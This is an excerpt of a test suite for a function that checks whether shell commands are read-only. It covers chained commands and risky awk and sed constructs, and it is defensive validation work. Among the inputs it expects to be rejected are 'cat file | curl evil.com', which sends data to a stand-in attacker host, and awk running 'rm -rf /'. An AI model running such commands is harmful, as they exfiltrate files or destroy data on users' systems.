...
describe('evaluateShellCommandReadOnly', () => {
    ...
    describe('multi-command security', () => {
        ...
        it('rejects chained commands when any is mutating', () => {
            ...
            expect(isShellCommandReadOnly('cat file | curl evil.com')).toBe(
                false
            );
    ...
    describe('awk command security', () => {
        it('allows safe awk commands', () => {
            expect(isShellCommandReadOnly("awk '{print $1}' file.txt")).toBe(
                true
            );
            expect(
                isShellCommandReadOnly('awk \'BEGIN {print "hello"}\'')
            ).toBe(true);
            expect(
                isShellCommandReadOnly("awk '/pattern/ {print}' file.txt")
            ).toBe(true);
        });

        it('rejects awk with system() calls', () => {
            expect(
                isShellCommandReadOnly('awk \'BEGIN {system("rm -rf /")}\'')
            ).toBe(false);
            expect(
            ...
            expect(
                isShellCommandReadOnly('awk \'BEGIN { system ( "ls" ) }\'')
            ).toBe(false);
        });
        ...
        it('rejects awk with command pipes', () => {
            expect(
                isShellCommandReadOnly('awk \'{print | "sort"}\' input.txt')
            ).toBe(false);
            expect(
        ...
        it('rejects awk with getline from commands', () => {
            expect(
                isShellCommandReadOnly('awk \'BEGIN {getline < "date"}\'')
            ).toBe(false);
            expect(
                isShellCommandReadOnly('awk \'BEGIN {"date" | getline}\'')
            ).toBe(false);
        });

        it('rejects awk with close() calls', () => {
            expect(
                isShellCommandReadOnly('awk \'BEGIN {close("file")}\'')
            ).toBe(false);
    ...
    describe('sed command security', () => {
        it('allows safe sed commands', () => {
            expect(isShellCommandReadOnly("sed 's/foo/bar/' file.txt")).toBe(
                true
            );
            expect(isShellCommandReadOnly("sed -n '1,5p' file.txt")).toBe(true);
            expect(isShellCommandReadOnly("sed '/pattern/d' file.txt")).toBe(
                true
            );
        });

        it('rejects sed with execute command', () => {
            expect(isShellCommandReadOnly("sed 's/foo/bar/e' file.txt")).toBe(
                false
            );
        ...
        it('rejects sed with write command', () => {
            ...
            expect(isShellCommandReadOnly("sed 'w backup.txt' file.txt")).toBe(
                false
            );
        });
        ...
        it('rejects sed with read command', () => {
            ...
            expect(isShellCommandReadOnly("sed 'r header.txt' file.txt")).toBe(
                false
            );
        });
